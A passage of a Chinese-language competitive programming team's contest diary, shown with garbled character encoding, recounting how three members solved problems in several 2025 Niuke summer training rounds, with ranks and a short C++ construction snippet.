çš„æ•°æ®èŒƒå›´ï¼Œä¸å‡ºæ„å¤–ï¼Œè¢«å¡ç²¾åº¦äº†ã€‚è¢«å¡äº†ä¸€ä¸ªå¤šå°æ—¶ï¼Œä¸­é—´è¿˜ä¸€åº¦æ€€ç–‘åšæ³•æ˜¯ä¸æ˜¯æœ‰é—®é¢˜ï¼Œæœ€ååœ¨è¿™ä¸ªåšæ³•ä¸Šä¼˜åŒ–äº†ä¸€ä¸‹ç²¾åº¦é—®é¢˜ï¼Œç»ˆäº AC äº†ã€‚ ã€*ã€‘Scy åœ¨é™æ€è°ƒè¯•çš„æ—¶å€™ï¼ŒZlw åˆå’Œ Sky è®¨è®ºå‡ºäº† Hã€‚ä½†æ˜¯å†™å®Œæäº¤äº†å‡ æ¬¡éƒ½æ˜¯ WAï¼Œä¹Ÿåœ¨çº¢æ¸©çš„è¾¹ç¼˜ï¼ˆå°¤å…¶æ˜¯ Skyï¼Œè¿ç»­çœ‹äº†ä¸¤å¨ï¼‰ã€‚G è®¡ç®—å‡ ä½•çš„é€šè¿‡ç®—æ˜¯ç¨³å®šäº†é˜Ÿå†…çš„æƒ…ç»ªã€‚ ã€Zlwã€‘Scy å†™ G çš„æ—¶å€™æˆ‘å’Œ Sky è®¨è®ºäº†ä¸€ä¸‹ï¼Œå‘ç°æšä¸¾è¾¹ä½œä¸ºè·¯å¾„ä¸Šæœ€å¤§çš„ $w$ï¼Œç„¶åé—®é¢˜å°±è½¬æ¢ä¸ºè‹¥å¹²ä¸ªä¸€æ¬¡å‡½æ•°åœ¨æŸä¸ªä½ç½®çš„æœ€ä¼˜è§£ã€‚ä½†æ˜¯è¿™é‡Œæƒ³çš„åŒæŒ‡é’ˆåšæ³•å‡äº†ï¼Œä¸€ç›´åˆ°æœ€å 40min æ‰å‘ç°ã€‚ç„¶å Scy è°ƒå‡ºäº† Gï¼Œæ¥ä¸€èµ·æƒ³ï¼Œå› ä¸ºæ²¡äººä¼šæ”¹æè¶…æ ‘çš„æ¨¡æ¿ï¼Œæå‡ºæ˜¯å¦å¯ä»¥ç»´æŠ¤ä¸€ä¸ªä¸Šå‡¸åŒ…ã€‚è§‚å¯Ÿè§„å¾‹å°è¯•äº†ä¸€ä¸ªå½¢ä¼¼å•è°ƒæ ˆçš„ä¸œè¥¿ç»´æŠ¤ä¸Šå‡¸åŒ…è¿‡äº†ã€‚ ã€Skyã€‘åœ¨çº¢æ¸© G çš„æ—¶å€™ï¼Œæˆ‘ä¹Ÿæ¥å¸® Zlw æƒ³äº†ä¸‹ Hï¼Œä»–è¯´äº†ä¸‹ä»–çš„åšæ³•ï¼Œä½†æˆ‘å½“æ—¶å…¶å®åªå¬æ‡‚äº†å‰åŠæ®µï¼ŒååŠæ®µæœ‰ç‚¹è¿·ç³Šæ²¡æœ‰å¬æ‡‚ï¼Œå°±è®¤ä¸º Zlw è¿™ä¸ªåšæ³•æ²¡æœ‰ä»»ä½•é—®é¢˜ï¼Œåœ¨æ€è€ƒ G é”™åœ¨å“ªçš„åŒæ—¶ï¼ŒZlw ä¸Šæœºç›´æ¥æ•²äº† Hã€‚ ä½†é—®é¢˜åˆšå¥½å°±å‡ºåœ¨è¿™ä¸ªååŠæ®µï¼Œåœ¨å¤„ç† $t_j - w_j \\times k_i$ è¿™ä¸ªå¼å­çš„æ—¶å€™ï¼ŒZlw çš„åŒæŒ‡é’ˆç¥ç§˜åšæ³•å…¶å®æ˜¯æœ‰é—®é¢˜çš„ï¼Œæœ€åå¿«åŠä¸ªå°æ—¶çš„æ—¶å€™çªç„¶å‘ç°ã€‚ç„¶åæƒ³ç€è¿™é‡Œå¥½åƒæœ‰ç‚¹åƒæè¶…çº¿æ®µæ ‘ï¼Œä½†è¿™é“é¢˜çš„é€šè¿‡äººæ•°åº”è¯¥ç”¨ä¸åˆ°è¿™ä¹ˆå¤æ‚çš„æ•°æ®ç»“æ„ï¼Œä¸‰ä¸ªäººå°±åŒæ—¶å¼€å§‹æƒ³æ€ä¹ˆå»è§£å†³è¿™ä¸ªé—®é¢˜ã€‚æœ€åä¸¤ä¸ªé˜Ÿå‹æƒ³åˆ°äº†å•è°ƒæ ˆç»´æŠ¤ä¸‹å‡¸åŒ…ï¼ŒZlw åœ¨é«˜å‹ä¹‹ä¸‹å…‰é€Ÿå†™å®Œå¹¶ä¸€å‘è¿‡ï¼Œæ¿€åŠ¨äººå¿ƒå•Šï¼Œæ¿€åŠ¨äººå¿ƒã€‚ ã€*ã€‘H çš„åšæ³•å‡äº†ä¸€å°éƒ¨åˆ†ï¼Œè¯´æ˜éªŒè¯æ­£ç¡®æ€§è¿™ä¸€éƒ¨åˆ†ä»ç„¶éœ€è¦æ”¹è¿›ã€‚å¥½åœ¨å¤§å®¶ä¸æ–­åœ°ç›¸äº’é¼“åŠ±ä¸‹ï¼Œæå‡ºäº†å‡¸åŒ…çš„ä¼˜åŒ–ï¼Œåœ¨å¹¶ä¸æ˜¯é‚£ä¹ˆç†Ÿæ‚‰çš„æƒ…å†µä¸‹åœ¨ $04:53$ æé™é€šè¿‡äº† Hï¼ˆä¹Ÿç®—æ˜¯ä¸Šä¸€æ¬¡èµ›åä¸¤ç§’è¿‡é¢˜çš„è¡¥å¿äº†å§ï¼‰ï¼ 2025ç‰›å®¢æš‘æœŸå¤šæ ¡è®­ç»ƒè¥3 ã€çœæµç‰ˆã€‘ä¼¼ä¹è¿˜æ˜¯ç®€å•åœºï¼Œ$7/11$ é¢˜ï¼Œ$\\texttt{rank 181/1610}$ã€‚$7 \\to 8$ é¢˜çš„ gap ä¼¼ä¹æŒºå¤§çš„ï¼Œå››å°æ—¶åšå®Œ $7$ é¢˜ä»¥åå°±å¼€å§‹åç‰¢ï¼Œæœ€åæå‰ä¸‹ç­ã€‚ ã€*ã€‘Zlw åœ¨è€ƒ STA2001ï¼Œæ‰€ä»¥æ™šäº†ç‚¹æ¥ï¼›ç„¶å Sky è¦å»ä¸Šæš‘è¯¾ï¼Œæ‰€ä»¥æå‰ä¸¤å°æ—¶èµ°äº†ï¼›åªæœ‰ Scy å…¨ç¨‹åœ¨åƒ ã€æ•°æ®åˆ é™¤ã€‘ã€‚ ã€Scyã€‘çœ‹åˆ°äº† F æ˜¯ç­¾åˆ°ï¼Œ2 min ä¸€å‘é€šè¿‡ã€‚Zlw åœ¨è·¯ä¸Šç…äº†çœ¼ Dï¼Œå¤§è‡´ç¡®å®šäº†ä¸€ä¸ªç»“è®ºï¼Œäºæ˜¯ä¸¢ç»™æˆ‘æ¥å®ç°ï¼Œåœ¨ $00:15$ é€šè¿‡ã€‚ ã€Skyã€‘J ä¹Ÿæ˜¯ç­¾åˆ°é¢˜ï¼Œè€ƒè™‘ç›´æ¥æš´åŠ›çš„å¤æ‚åº¦å¾ˆä½ï¼Œå¤§æ¦‚æ˜¯ $O(t\\log V)$ï¼Œä½†æˆ‘å†™å¤ªä¸‘äº†ï¼Œå¯¼è‡´Tæ‰ä¸¤å‘ï¼ˆæƒ³å‰²æ‰‹.jpgï¼‰ï¼Œæƒ³äº†ä¸€ä¸‹å¥½åƒæœ‰ç»“è®ºï¼Œå°±æ˜¯å…ˆåŒé™¤ä»¥ $\\gcd(a,b)$ ä½¿å¾—äº’è´¨ï¼Œç„¶åå¦‚æœæœ‰ $a+b=2^k$ï¼Œç­”æ¡ˆå°±æ˜¯æ•´æ•° $k$ï¼Œå¦åˆ™æ— è§£ï¼Œè¿‡é¢˜äº†ã€‚ ã€Scyã€‘åœ¨ Sky çº¢æ¸©çš„æ—¶å€™å»çœ‹äº† Aï¼Œæ˜¯ä¸€ä¸ªæ„é€ ï¼Œç¡®å®æ˜¯æˆ‘çš„é¢˜ï¼Œäºæ˜¯å°±å¼€æƒ³ã€‚æƒ³åˆ°ä¸€ä¸ªç¨å¾®æœ‰ç‚¹å¥‡æ€ªä½†æ˜¯å¥½å†™çš„æ„é€ æ–¹æ³•ï¼Œç”¨ set åœ¨ç»´æŠ¤ã€‚ä¹‹ååˆå’Œ Zlw çœ‹äº† Eï¼Œå¤§æ¦‚ç¡®è®¤äº†ä»–çš„åšæ³•ã€‚ ã€Zlwã€‘ç­‰ Sky çº¢æ¸©å®Œæ¯•ä»¥åå¼€å†™ï¼Œçœ‹åˆ°è¿™ä¸ª $\\div \\times d$ çš„å½¢å¼æƒ³åˆ°å¯ä»¥çœ‹è´¨å› æ•°ï¼Œç„¶åç»Ÿä¸€æ¯ä¸ªè´¨æ•°çš„ä¸ªæ•°ã€‚ç„¶åä¸€å¼€å§‹å¿½ç•¥äº† $\\times$ æ“ä½œï¼Œä»¥ä¸ºæ˜¯ä¹‹å‰çš„ç»å…¸ç»“è®ºæŒ‘ä¸¤ä¸ªä¸åŒçš„æ•° $-1$ å‡åˆ° $0$ï¼ŒçŠ¹è±«äº†è¾ƒé•¿æ—¶é—´æ‰å‘ç°å¯ä»¥ $\\times$ï¼Œäºæ˜¯åªè·Ÿå¥‡å¶æ€§æœ‰å…³äº†ã€‚ç„¶ååˆ† $n$ çš„å¥‡å¶å’Œè´¨æ•°çš„å¥‡å¶è®¨è®ºã€‚ä½†æ˜¯ç­›çš„æ—¶å€™å‘ç° $O(m \\log m)$ é¢„å¤„ç†éœ€è¦ $2s$ å¡çº¿è¶…æ—¶ï¼Œå‘ç°ç­›çš„æœ‰ç‚¹ä¸‘ï¼Œæƒ³åŠæ³•ä¼˜åŒ–ï¼Œç„¶åç”¨çº¿æ€§ç­›å¤„ç†å‡ºæœ€å°è´¨å› æ•°ç„¶åç›´æ¥ç”¨ç±»ä¼¼ dp è½¬ç§»çš„æ–¹å¼ç»§æ‰¿ä¸Šä¸€ä½å‡ºç°æ¬¡æ•°ä¸ºå¥‡æ•°çš„è´¨å› æ•°ã€‚é¢„å¤„ç†æ—¶é—´é™åˆ° 1sï¼Œä½†ç¬¬ä¸€æ¬¡äº¤ä¸Šå» WAã€‚æƒ³äº†ä¸€ä¼šå„¿å‘ç° $n = 2$ æ—¶å€™éœ€è¦ç‰¹åˆ¤ï¼Œä¿®æ”¹äº†ä¸‹åè¿‡äº†ã€‚æ®è¯´é¢˜è§£æ˜¯ $O(m)$ çš„å“ˆå¸Œåšæ³•ã€‚ ã€Scyã€‘å†™äº†ä¸€å‘ç„¶å WAï¼Œäºæ˜¯æ•²äº†ä¸€ä¸ª checker çœ‹äº†åŠå¤©ä¸€ç›´æ‹ä¸å‡ºé”™ï¼Œäºæ˜¯é‡æ–°è¯»é¢˜ï¼Œå‘ç°æ˜¯ä¸€è¡Œä¸€åˆ—çš„ $\\operatorname{mex}$ï¼Œè€Œæˆ‘å†™çš„æ˜¯è¡Œåˆ—åŠ èµ·æ¥çš„ $\\operatorname{mex}$ã€‚äºæ˜¯å¤åˆ¶äº†ä¸€éæˆ‘çš„ä»£ç ä»¥åå†æ¬¡æäº¤ï¼Œç»ˆäºé€šè¿‡ã€‚ ã€Zlw Skyã€‘H é¢˜ä¸ Sky è®¨è®ºå‘ç°å¯ä»¥ç»´æŠ¤ä¸€ä¸ªç‚¹çš„æœ€çŸ­åˆ°è¾¾æ—¶é—´ï¼Œç„¶åç›´æ¥åˆ¤æ–­ã€‚ç»†æƒ³äº†ä¸€ä¼šå‘ç°å¯ä»¥ç›´æ¥æŸ“è‰²æ ‡æ—¶é—´æˆ³ï¼Œè¿™ä¸ªæ—¶å€™ Scy åœ¨ä¸Šæœºï¼Œç„¶åç»†èŠ‚è¿˜æŒºå¤šçš„ï¼Œé‚ä¸ Sky åå¤ç¡®è®¤ç»†èŠ‚ã€‚æœ€åå†™çš„æ˜¯æŸ“è‰² $+$ å€å¢ä½¿å¾—å¤æ‚åº¦ä¸º $O(n \\log n)$ï¼ŒZlw å¼ºå¤§çš„ç åŠ›å¾ˆå¿«å†™å®Œä¸€å‘è¿‡ã€‚ ã€Zlwã€‘B ä¸Šæ¥æƒ³åˆ°ä¸€ä¸ªéœ€è¦ $3\\log$ çš„æ„é€ ï¼Œå¯ä»¥æŠŠ $b$ æ¶ˆæˆ $0$ï¼Œ$a$ å˜æˆ $c$ï¼Œç„¶å $b \\rm xor a$ï¼Œåœ¨æŠŠ $b$ å˜æˆ $0$ çš„è¿‡ç¨‹ä¸­ç”¨æœ€é«˜ä½å¯¹ $a$ è¿›è¡Œ $\\rm xor$ æ“ä½œã€‚ä½†æ˜¯å‘ç°å½“ $\\max(a,b) c$ æ—¶å¾ˆéš¾åŠï¼Œä¹˜ä¸Šå»çš„ $30$ æ¬¡æ“ä½œéš¾ä»¥é¿å…ï¼Œä½†æ˜¯è”æƒ³åˆ° $b$ æ¶ˆæˆ $0$ çš„â€é¡ºè·¯â€å±æ€§ï¼Œæƒ³åˆ°èƒ½ä¸èƒ½â€œé¡ºè·¯â€æ”¹å˜ $a$ çš„æ›´é«˜ä½ã€‚ç„¶ååˆä» $a=0,b=1$ çš„æƒ…å†µæƒ³åˆ°å¯ä»¥ $\\times 2+1$ çš„å½¢å¼å‡‘å‡ºæ›´é«˜ä½ï¼Œäºæ˜¯å°†ä¸¤ä¸ªæƒ³æ³•ç»“åˆï¼Œå‘ç°å¯ä»¥å¹³ç§» $c$ çš„è¾ƒé«˜ä½ä¸ $a$ å¯¹é½ï¼Œç„¶åç”¨ $b$ æ”¹é€ è¾ƒé«˜ä½ï¼Œç”¨ $b=1$ å‡‘å‡ºè¾ƒä½ä½ï¼Œå‘ç°æ¬¡æ•°åˆšå¥½å¤Ÿï¼Œæµ‹è¯•äº†ä¸€ä¸‹æé™å¤§æ¦‚åœ¨ $63$ï¼Œäºæ˜¯äº¤é¢˜é€šè¿‡ã€‚ ã€Scyã€‘åäº† B ä¹Ÿæ˜¯æ„é€ ï¼Œä½†æ˜¯è¢« ZlwâœŒç»™ç§’äº†ã€‚éš¾ç‚¹ä¸»è¦æ˜¯ $\\max(a,b) c$ çš„æ—¶å€™ï¼Œè¿˜åœ¨æƒ³å„ç§å¥‡æ€ªçš„æ–¹æ³•çš„æ—¶å€™ Zlw ä¸¢ç»™æˆ‘ä¸€ä¸ªå›¾ï¼Œæˆ‘ç¡®è®¤äº†ä»–çš„åšæ³•ï¼Œç„¶åä»–å¼€å…±äº«å±å¹•å†™ï¼Œ$03:49$ é€šè¿‡è¯¥é¢˜ã€‚ ä¹‹åæˆ‘å°è¯•çœ‹ Iï¼Œæ˜¯ä¸€é“çº¯æ•°å­¦é¢˜ï¼Œå…ˆå»å­¦äº†ä¸€ä¸‹ç½®æ¢ç¾¤æ‰å‹‰å¼ºçœ‹æ‡‚é¢˜ç›®ã€‚ç”¨ OEIS å¤§è‡´å¼„å‡ºäº†ç‚¹ç»“è®ºï¼ŒçŒœæµ‹æ˜¯ä¸ªå¤šé¡¹å¼å·¥ç¨‹ï¼Œä½†æ˜¯æœ‰ä¸€äº›æ¿å­å¹¶ä¸ä¼šå†™ï¼Œé‚ä¸‹ç­ã€‚ ã€Skyã€‘ä»Šå¤©æ¯”è¾ƒæ‘†ï¼Œä¸¤ä½é˜Ÿå‹è¿‡é¢˜å¾ˆå¿«ï¼Œè€Œä¸”å› ä¸ºåé¢è¦ä¸Šæš‘è¯¾ï¼Œæ‰€ä»¥åªæ‰“äº†å‰ä¸‰ä¸ªå°æ—¶ğŸ˜­ï¼Œé€è¢«å¸¦é£ã€‚ 2025ç‰›å®¢æš‘æœŸå¤šæ ¡è®­ç»ƒè¥4 ã€çœæµç‰ˆã€‘è¢« Zlw å’Œ Sky å¸¦é£ï¼ŒScy è¢«æ„é€ ç¡¬æ§ï¼Œç¡¬æ˜¯åƒäº†å¨å¤§çš„ã€‚$4/13$ é¢˜ï¼Œ$\\texttt{rank 88/1544}$ã€‚ ã€Scyã€‘è¿™åœºæœ‰éš¾åº¦ï¼Œä¸Šæ¥ä¸€ä¸‹å­æ²¡æœ‰å‘ç°å¾ˆç­¾åˆ°çš„é¢˜ã€‚è¿‡äº†å‡ åˆ†é’Ÿçœ‹ F æœ‰äººè¿‡é¢˜ï¼Œé‚çœ‹é¢˜ã€‚ç¬¬ä¸€çœ¼æ˜¯ dpï¼Œæƒ³äº†ä¸€ä¸‹å‘ç°äº¤æ¢çš„ä»£ä»·æ˜¾ç„¶æ˜¯å¯ä»¥æ’¤é”€çš„ï¼Œäºæ˜¯ç›´æ¥æŒ‰ç…§äº¤æ¢åˆ°ç¬¬ä¸€ä½çš„ä»£ä»·ä»å¤§åˆ°å°æ’åºï¼Œç„¶åè´ªå¿ƒé€‰å³å¯ï¼Œ$00:19$ ä¸€å‘é€šè¿‡ã€‚ ã€Zlwã€‘ä¸Šæ¥å…ˆçœ‹çš„ Bï¼Œä¸€å¼€å§‹è¿‡çš„äººæ¯”è¾ƒå°‘ï¼Œæœ‰ç‚¹ä¸å¤ªæ•¢ç¡®å®šåšæ³•ã€‚ç®€å•å’Œ Sky ç¡®è®¤äº†ä¸€ä¸‹ï¼Œç­‰ Scy å†™å®Œä»¥åæˆ‘ä¸Šæ‰‹å†™ Bï¼Œçš„ç¡®å°±æ˜¯ç»´æŠ¤ä¸€ä¸ªâ€œæ­»èƒ¡åŒç‚¹â€œæœ€å³è¾¹åˆ°è¾¾çš„åˆ—æ•°å³å¯ã€‚ ã€Scyã€‘å‘ç° D æ˜¯ä¸€ä¸ªå’Œçº¿æ€§ä»£æ•°æœ‰å…³çš„æ„é€ ï¼ŒSky æ‰‹ç©äº†ä¸€ä¼šå„¿æ¯«æ— æƒ³æ³•ï¼Œè€Œ Zlw è‡ªç„¶ä¸å»ç¢°æ„é€ çš„ï¼Œäºæ˜¯æˆ‘å¼€å§‹æƒ³é¢˜ã€‚ ã€Zlw Skyã€‘ Sky å…ˆçœ‹äº†ä¸€ä¼šï¼Œå°è¯•ä»å¤šè§£çš„ç»“æ„æ€è€ƒã€‚Zlw åœ¨ä» $-1/1$ è½¬åŒ–å¯»æ‰¾æ€§è´¨ã€‚ç„¶åç»è¿‡ Sky æé†’ï¼Œå‘ç°å½“ä¸¤ç§æ‹¬å·éƒ½å‡ºç°é—®å·æ—¶ï¼Œæœ‰å¾ˆå¤§æ¦‚ç‡æ˜¯å¤šè§£çš„ã€‚ä»è¿™ä¸ªè§’åº¦å…·ä½“åˆ†æï¼Œå‘ç°å¦‚æœå­˜åœ¨ $\\texttt{)(}$ å¿…ç„¶å¯ä»¥é€šè¿‡äº¤æ¢è¿™ä¸¤ä½å¾—åˆ°å¤šè§£ã€‚è¿›ä¸€æ­¥ç ”ç©¶äº¤æ¢å¸¦æ¥çš„å½±å“ï¼Œå‘ç°å³å½“æ»¡è¶³å‰ç¼€å’Œåœ¨ $[l,r)$ çš„æœ€å°å€¼ $\\geq 2$ æ—¶ï¼Œæœ‰å¤šè§£ã€‚ä¸”å»é™¤æ‰ $\\texttt{)(}$ ï¼Œæœ€ç»ˆå¿…å®šæ˜¯å½¢å¦‚ $\\texttt{(}\\cdots \\texttt{(()} \\cdots \\texttt{)}$ çš„å½¢å¼ã€‚å†è§‚å¯Ÿåˆ°æ¯ä¸ªå­—ç¬¦çš„ä¼ è¾“æ­£ç¡®æ¦‚ç‡æ˜¯ $\\frac{1}{2}$ï¼Œæœ€åæ¦‚ç‡åˆ†æ¯ä¸º $2^{\\lvert s \\rvert}$ï¼Œç„¶å Zlw æå‡ºåˆ†å­å¯ä»¥è€ƒè™‘è®¡æ•°ï¼Œå›ºå®šä¸€ä¸ªå·¦æ‹¬å·ï¼Œç„¶åå»è®¡ç®—å³è¾¹æœ‰å“ªäº›å³æ‹¬å·å¯ä»¥å˜æˆ $\\texttt{?}$ã€‚Zlw ä½¬ç¡®è®¤åšæ³•ä¹‹åå¾ˆå¿«å°±è¿‡é¢˜äº†ã€‚ ã€Scyã€‘çº¸ç¬”è¿·é¢˜ä¸­ã€‚ä¸€å¼€å§‹è€ƒè™‘çš„æ˜¯ $n \\times n$ çš„ 01 çŸ©é˜µè¡Œåˆ—å¼çš„æœ€å¤§å€¼ã€‚$n = 3$ è¡Œåˆ—å¼ä¸º $2$ï¼Œä¸€ä¸ªæ˜¾ç„¶çš„æ„é€ å¦‚ä¸‹ï¼š \\begin{bmatrix} 1 & 0 & 1 \\\\ 1 & 1 & 0 \\\\ 0 & 1 & 1 \\end{bmatrix}ç„¶åä¹‹åè¿›ä¸€æ­¥å°è¯•ï¼Œå‘ç° $n = 4,5,6,7$ æ—¶æœ€å¤§ä¸º $3,5,9,32$ï¼Œå…¶å®ä¹Ÿå°±æ˜¯è¿™ä¸ªæ•°åˆ—ã€‚å¤§æ¦‚æ‰¾åˆ°äº†æ„é€ æœ€å¤§å€¼çš„æ–¹å¼ï¼Œä½†æ˜¯å‘ç°ç”±æœ€å¤§å€¼ä¸å¤ªå¥½è°ƒæ•´åˆ°ä»»æ„å€¼ï¼Œäºæ˜¯å€’é—­ã€‚ ã€Sky Zlwã€‘ç®€åŒ–ç‰ˆçš„æ¨ç®±å­é—®é¢˜ï¼Œæ²¡æœ‰å°äººï¼Œç®±å­å¯ä»¥è‡ªå·±åŠ¨ï¼Œæ‰€ä»¥å˜å¾—æŒºç®€å•ã€‚å› ä¸ºæ²¡æœ‰é™åˆ¶ç®±å­å¯¹åº”çš„ç›®æ ‡ï¼Œæ‰€ä»¥è§‚å¯Ÿå¾—çŸ¥ï¼Œåªè¦ä¸€ä¸ªè¿é€šå—çš„ç®±å­æ•°è·Ÿç›®æ ‡æ•°ç›¸ç­‰å°±ä¸€å®šæœ‰è§£ã€‚ Sky æå‡ºç®±å­å¯ä»¥äº’ç›¸â€ç©¿å¢™â€œï¼Œå…·ä½“è¡¨ç°ä¸ºé€šè¿‡â€ç»§æ‰¿â€œçš„æ–¹å¼è®©æ•´ä½“çœ‹ä¸Šå»åƒæ˜¯ç©¿è¿‡å»ï¼Œç”±æ­¤å‘ç°çª„é“å¹¶ä¸ä¼šå½±å“ç­”æ¡ˆï¼Œäºæ˜¯ç›´æ¥åˆ¤è¿é€šå—å†…ç®±å­æ•°ç­‰äºç›®æ ‡æ•°ã€‚ï¼ˆå½“ä¸€ä¸ªç®±å­æŒ¡ä½å¦ä¸€ä¸ªç®±å­å»è·¯æ—¶ï¼Œå¯ä»¥ä¸¤ä¸ªéƒ½å¾€å‰èµ°ä¸€æ ¼ï¼Œåšåˆ°ä¸€ç§â€œç©¿è¿‡â€çš„æ•ˆæœï¼Œå› ä¸ºç®±å­ä¹‹é—´æ²¡æœ‰åŒºåˆ«ï¼Œæ‰€ä»¥åˆæ³•ï¼‰ã€‚è€Œä¸”è¿™æ ·å­åšä½¿å¾—ç­”æ¡ˆç‰¹åˆ«å®¹æ˜“æ„é€ ï¼Œæ‰¾åˆ°ä¸€ä¸ªç®±å­å¯¹åº”éšä¾¿ä¸€ä¸ªç›®æ ‡çš„ç§»åŠ¨è·¯å¾„ï¼ˆSky å–äº†æœ€çŸ­è·¯ï¼‰ï¼Œå¦‚æœæœ‰ç®±å­æŒ¡ä½å°±å¯¹ç§»åŠ¨è·¯å¾„åšä¸€æ¬¡ reverse æ“ä½œï¼Œç„¶åç›´æ¥è¾“å‡ºå³å¯ï¼Œå¾ˆå·§å¦™ã€‚ è·Ÿ Zlw è®¨è®ºç¡®è®¤ç®—æ³•ç®€å•ä¹‹åæˆ‘å°±ä¸Šæœºå†™äº†ï¼Œä½†æ˜¯å¤§æ¨¡æ‹Ÿç é‡æ¯”è¾ƒå¤§ï¼Œæˆ‘å†™äº†å¾ˆä¹…ï¼Œç åŠ›è¿™ä¸€å—è¿˜å¾—ç»ƒã€‚è€Œä¸”å› ä¸ºä¸€ä¸ªå”é—®é¢˜ï¼ˆbfs è®¡æ•°åŒä¸€ä¸ªè¿é€šå—å†…çš„ç®±å­å’Œç›®æ ‡æ•°å±…ç„¶ç®—é‡äº†å¾ˆå¤šï¼‰WA äº†å‡ å‘ï¼Œå¯¼è‡´åšäº†å¿«ä¸¤ä¸ªå°æ—¶ã€‚è¿˜å¥½è¿™é¢˜åšå‡ºæ¥çš„äººä¹Ÿä¸å¤šï¼Œæ’åæå‡äº†äº›ã€‚ ã€Scyã€‘è¿˜åœ¨çº¸ç¬”è¿·é¢˜ä¸­ã€‚æƒ³æ¥æƒ³å»è¿˜æ˜¯å›åˆ°äºŒè¿›åˆ¶æ‹†åˆ†ä¸Šã€‚åŸºäº $n = 3$ çš„æ„é€ å¤–åŠ å¯¹è§’çŸ©é˜µå¯ä»¥ä½¿å¾— $|A^{\\prime}| = |A| \\times 2$ï¼Œç„¶åå†ç¬¬ä¸€è¡Œæ”¾ä¸€ä¸ª $1$ å¯ä»¥å®ç° $+1$ çš„æ•ˆæœã€‚å•Šï¼Œè¢«ç¡¬æ§ 4h ç»ˆäºæ˜¯æƒ³åˆ°è§£æ³•äº†ï¼Œä½†æ˜¯å®ç°æœ‰ä¸€å®šç»†èŠ‚ï¼Œç•™ç»™æˆ‘ 15 min å»å®ç°ã€‚ å†™å®Œä»¥åæ²¡æœ‰æµ‹ç›´æ¥äº¤ï¼Œä½†æ˜¯ WAã€‚ç®€å•ä¿®æ”¹äº†ä¸€ä¸‹ï¼Œå†äº¤ï¼Œå·²ç»æ˜¯ $04:59$ï¼Œè¯„æµ‹é˜Ÿåˆ—è¶…çº§é•¿ï¼Œç­‰è¿”å› WA çš„æ—¶å€™å·²ç»ç»“æŸäº†ã€‚ å®³ï¼Œè¢«ä¸€é“æ„é€ ç¡¬æ§äº†ã€‚èµ›åå‘ç°å¥‡å¶æ€§æœ‰ç‚¹é—®é¢˜ï¼Œç¨å¾®è°ƒæ•´äº†ä¸€ä¸‹æ„é€ å°± AC äº†ã€‚ ä»¥åæˆ‘å¯ä»¥ä¸è´Ÿè´£æ„é€ äº†å˜›ï¼Œå¼€ç‚¹ç é‡é¢˜ä¹Ÿè¡Œï¼ˆ ã€Scyã®è¡¥é¢˜ã€‘ L å†™æˆè¡¨è¾¾å¼ä¸º $x \\leftarrow \\lceil \\frac{x + a_i}{2} \\rceil$ åå°±å¯ä»¥è¿­ä»£ï¼Œæ³¨æ„åˆ°åŒºé—´é•¿åº¦å¤§äº $30$ æ—¶ç”±äº $2^{30} 10^9$ï¼Œå› æ­¤ $x$ å¯¹ç­”æ¡ˆçš„å½±å“æœ€å¤šå·® $1$ã€‚äºæ˜¯ä¸è¶…è¿‡ $30$ æš´åŠ›è®¡ç®—ï¼Œè¶…è¿‡ $30$ ç›´æ¥ç”¨ $x = 0$ æ—¶å€™çš„ç­”æ¡ˆï¼ˆåªéœ€è¦åˆ¤æ–­æ˜¯å¦æœ‰ $1$ çš„å½±å“å³å¯ï¼‰ã€‚ A é¢˜ç®—æ˜¯æ¯”è¾ƒé€†å¤©ï¼Œèµ›æ—¶ $16/55$ï¼Œæ„Ÿè§‰æ¦œæ­ªåˆ°å“ªå»éƒ½ä¸çŸ¥é“äº†ã€‚è€ƒè™‘æ„é€ ä¸‰ç§ç±»å‹çš„æ•°ï¼ˆç»„ï¼‰ $A,B,C$ ä½œä¸ºåŸºï¼Œéœ€è¦æ»¡è¶³ $D(A,B) \\frac{1}{2},D(A,C) \\frac{1}{2},D(B,C) = \\frac{1}{2}$ï¼Œè¿™æ ·å¤„ç†æ¯ä¸€è¡Œçš„æ—¶å€™ä»¥ $A$ ä¸ºåŸºå‡†ï¼Œéœ€è¦èµ¢çš„è¯å°±ç”¨ $B$ï¼Œè¾“çš„è¯ç”¨ $C$ã€‚ ç›´æ¥å»æ‰¾æ¯”è¾ƒå›°éš¾ï¼Œæˆ‘ç›´æ¥å†™äº†æš´åŠ›å»æ‰¾ã€‚é€šè¿‡ç¨‹åºæœç´¢ï¼Œå‘ç°é•¿åº¦è‡³å°‘ä¸º $3$ï¼Œå€¼åŸŸä¸º $[0,4]$ æ—¶æ‰æœ‰è§£ï¼Œä»¥ä¸‹æ˜¯æˆ‘ç”¨çš„ä¸€ç»„åŸºï¼š 1 1 20 1 30 2 2 æœ€åç›´æ¥æŒ‰ç…§è¿™ä¸ªæ„é€ å³å¯ï¼š if (i == j) ans[j].push_back (6 * i + 1); ans[j].push_back (6 * i + 1); ans[j].push_back (6 * i + 2);else if (s[i][j] == 1) ans[j].push_back (6 * i + 0); ans[j].push_back (6 * i + 1); ans[j].push_back (6 * i + 3);else ans[j].push_back (6 * i + 0); ans[j].push_back (6 * i + 2); ans[j].push_back (6 * i + 2); 2025ç‰›å®¢æš‘æœŸå¤šæ ¡è®­ç»ƒè¥5 ã€çœæµç‰ˆã€‘ åˆæ˜¯åç‰¢åœºï¼Œ$4/13$ é¢˜ï¼Œ$\\texttt{rank 172/1605}$ã€‚ ã€Scyã€‘å¼€å±€è·Ÿæ¦œï¼ŒI æ˜¯ç­¾åˆ°ï¼Œåˆ†ç±»è®¨è®ºå³å¯ã€‚$n$ ä¸ºå¶æ•°ï¼Œç›´æ¥ $i$ ä¸ $n - i$ æ‹¼åœ¨ä¸€è¡Œï¼›$n$ ä¸ºå¥‡æ•°ï¼Œ$i$ ä¸ $n - i - 1$ æ‹¼åœ¨ä¸€è¡Œï¼Œ$n$ å•ç‹¬æˆä¸€è¡Œã€‚å› æ­¤ç­”æ¡ˆä¸º $3n + 1 + [n \\bmod 2 = 1]$ã€‚ ã€Scyã€‘ çœ‹äº† D æ„é€ ï¼Œæ‰“ä¸ªè¡¨æ‰¾è§„å¾‹ï¼Œä½†æ˜¯æ²¡æœ‰å‘ç°ä»€ä¹ˆæœ‰ä»·å€¼çš„åœ°æ–¹ã€‚è¿™æ—¶å€™ Zlw è®©æˆ‘æ¥çœ‹çœ‹ Eï¼Œè¯»å®Œé¢˜ä»¥åæå‡ºå¯ä»¥æŒ‰ä½æ¥ç®—è´¡çŒ®ï¼Œç„¶åæƒ³åˆ°äº†ä¸ª 